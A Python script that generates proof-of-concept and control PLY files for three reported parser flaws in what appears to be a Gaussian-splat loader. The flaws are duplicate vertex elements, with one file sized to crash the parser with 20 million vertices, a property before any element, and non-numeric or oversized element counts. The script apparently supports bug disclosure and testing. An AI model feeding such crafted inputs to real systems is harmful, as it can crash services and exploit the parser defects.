#!/usr/bin/env python3
"""Generates the PoC and control .ply inputs for the three findings.

Finding 1 files use binary_little_endian so that every data byte is
deterministic (no float text parsing involved).
"""
import struct
import sys

OUT = sys.argv[1] if len(sys.argv) > 1 else "inputs"

# Values for the first (gsplat) vertex element: distinct sentinels per channel.
N1 = 8
E1_ROW = (
    [0.0, 1.0, 2.0]                       # x y z
    + [1000.0, 2000.0, 3000.0]            # f_dc_0..2
    + [4000.0]                            # opacity
    + [5000.0, 5100.0, 5200.0]            # scale_0..2
    + [6000.0, 6100.0, 6200.0, 6300.0]    # rot_0..3
)


def gsplat_header(n1: int, n2_props: str, n2: int) -> str:
    lines = [
        "ply",
        "format binary_little_endian 1.0",
        "comment PoC: duplicate `element vertex` sections (Finding 1)",
        "element vertex %d" % n1,
        "property float x",
        "property float y",
        "property float z",
        "property float f_dc_0",
        "property float f_dc_1",
        "property float f_dc_2",
        "property float opacity",
        "property float scale_0",
        "property float scale_1",
        "property float scale_2",
        "property float rot_0",
        "property float rot_1",
        "property float rot_2",
        "property float rot_3",
        "element vertex %d" % n2,
    ] + n2_props.splitlines() + [
        "end_header",
    ]
    return ("\n".join(lines) + "\n").encode()


def write(name: str, blob: bytes):
    with open(f"{OUT}/{name}", "wb") as f:
        f.write(blob)
    print(f"wrote {OUT}/{name} ({len(blob)} bytes)")


# --- Finding 1: small PoC (8 + 64 vertices; attrs sized 8) --------------
N2 = 64
blob = gsplat_header(N1, "property float x\nproperty float y\nproperty float z", N2)
for r in range(N1):
    blob += struct.pack("<14f", *[v + r for v in E1_ROW])
for r in range(N2):
    blob += struct.pack("<3f", 10.0 + r, 11.0 + r, 12.0 + r)
write("poc1_duplicate_vertex_elements.ply", blob)

# --- Finding 1: control (single element with 72 vertices, same layout) --
blob = gsplat_header(N1 + N2, "property float x\nproperty float y\nproperty float z",
                     N1 + N2).replace(
    b"element vertex 72\nproperty float x\nproperty float y\nproperty float z\nend_header",
    b"element vertex 72\nproperty float f_dc_0\nproperty float f_dc_1\n"
    b"property float f_dc_2\nproperty float opacity\nproperty float scale_0\n"
    b"property float scale_1\nproperty float scale_2\nproperty float rot_0\n"
    b"property float rot_1\nproperty float rot_2\nproperty float rot_3\n"
    b"property float x\nproperty float y\nproperty float z\nend_header")
# The replace above is fragile; build the control header explicitly instead.
ctrl_lines = [
    "ply",
    "format binary_little_endian 1.0",
    "comment control: single element, attribute size == vertex count",
    "element vertex %d" % (N1 + N2),
    "property float x", "property float y", "property float z",
    "property float f_dc_0", "property float f_dc_1", "property float f_dc_2",
    "property float opacity",
    "property float scale_0", "property float scale_1", "property float scale_2",
    "property float rot_0", "property float rot_1", "property float rot_2",
    "property float rot_3",
    "end_header",
]
blob = ("\n".join(ctrl_lines) + "\n").encode()
for r in range(N1 + N2):
    blob += struct.pack("<14f", *[v + (r % N1) for v in E1_ROW])
write("poc1_control_single_element.ply", blob)

# --- Finding 1: crash-scale PoC (8 + 20,000,000 vertices) ----------------
N2_BIG = 20_000_000
blob = gsplat_header(N1, "property short x\nproperty short y\nproperty short z", N2_BIG)
for r in range(N1):
    blob += struct.pack("<14f", *[v + r for v in E1_ROW])
one_row = struct.pack("<3h", 1, 2, 3)
blob += one_row * N2_BIG
write("poc1_crash_large.ply", blob)

# --- Finding 2: `property` before any `element` --------------------------
write("poc2_property_before_element.ply",
      b"ply\nformat ascii 1.0\ncomment PoC: property line before any element "
      b"(Finding 2)\nproperty float x\nend_header\n")
write("poc2_control_valid_header.ply",
      b"ply\nformat ascii 1.0\nelement vertex 1\nproperty float x\n"
      b"property float y\nproperty float z\nend_header\n1.0 2.0 3.0\n")

# --- Finding 3: non-numeric / out-of-range element count ----------------
write("poc3_non_numeric_count.ply",
      b"ply\nformat ascii 1.0\ncomment PoC: non-numeric element count "
      b"(Finding 3)\nelement vertex x\nproperty float x\nend_header\n")
write("poc3_out_of_range_count.ply",
      b"ply\nformat ascii 1.0\nelement vertex 99999999999999999999\n"
      b"property float x\nend_header\n")
write("poc3_control_valid_count.ply",
      b"ply\nformat ascii 1.0\nelement vertex 1\nproperty float x\n"
      b"property float y\nproperty float z\nend_header\n1.0 2.0 3.0\n")
